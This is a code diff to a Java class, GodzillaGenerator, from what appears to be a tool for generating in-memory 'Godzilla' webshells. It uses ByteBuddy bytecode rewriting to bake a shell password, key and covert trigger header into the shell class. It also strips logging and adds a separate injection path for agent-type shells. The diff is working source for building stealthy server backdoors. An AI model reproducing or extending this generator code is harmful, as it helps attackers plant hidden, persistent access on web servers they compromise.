@@ -1,14 +1,18 @@
 package com.reajason.javaweb.memshell.generator;
 
+import com.reajason.javaweb.buddy.LdcReAssignVisitorWrapper;
 import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
 import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
 import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
+import com.reajason.javaweb.memshell.config.Constants;
 import com.reajason.javaweb.memshell.config.GodzillaConfig;
 import com.reajason.javaweb.memshell.config.ShellConfig;
 import net.bytebuddy.ByteBuddy;
 import net.bytebuddy.dynamic.DynamicType;
 import org.apache.commons.codec.digest.DigestUtils;
 import org.apache.commons.lang3.StringUtils;
+
+import java.util.Map;
 
 import static net.bytebuddy.matcher.ElementMatchers.named;
 
@@ -38,12 +42,7 @@ public class GodzillaGenerator {
         DynamicType.Builder<?> builder = new ByteBuddy()
                 .redefine(godzillaConfig.getShellClass())
                 .name(godzillaConfig.getShellClassName())
-                .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()))
-                .field(named("pass")).value(godzillaConfig.getPass())
-                .field(named("key")).value(md5Key)
-                .field(named("md5")).value(md5)
-                .field(named("headerName")).value(godzillaConfig.getHeaderName())
-                .field(named("headerValue")).value(godzillaConfig.getHeaderValue());
+                .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()));
 
         if (shellConfig.isJakarta()) {
             builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
@@ -51,6 +50,24 @@ public class GodzillaGenerator {
 
         if (shellConfig.isDebugOff()) {
             builder = LogRemoveMethodVisitor.extend(builder);
+        }
+
+        if (shellConfig.getShellType().startsWith(Constants.AGENT)) {
+            builder = builder.visit(
+                    new LdcReAssignVisitorWrapper(Map.of(
+                            "pass", godzillaConfig.getPass(),
+                            "key", md5Key,
+                            "md5", md5,
+                            "headerName", godzillaConfig.getHeaderName(),
+                            "headerValue", godzillaConfig.getHeaderValue()
+                    ))
+            );
+        } else {
+            builder = builder.field(named("pass")).value(godzillaConfig.getPass())
+                    .field(named("key")).value(md5Key)
+                    .field(named("md5")).value(md5)
+                    .field(named("headerName")).value(godzillaConfig.getHeaderName())
+                    .field(named("headerValue")).value(godzillaConfig.getHeaderValue());
         }
         return builder;
     }
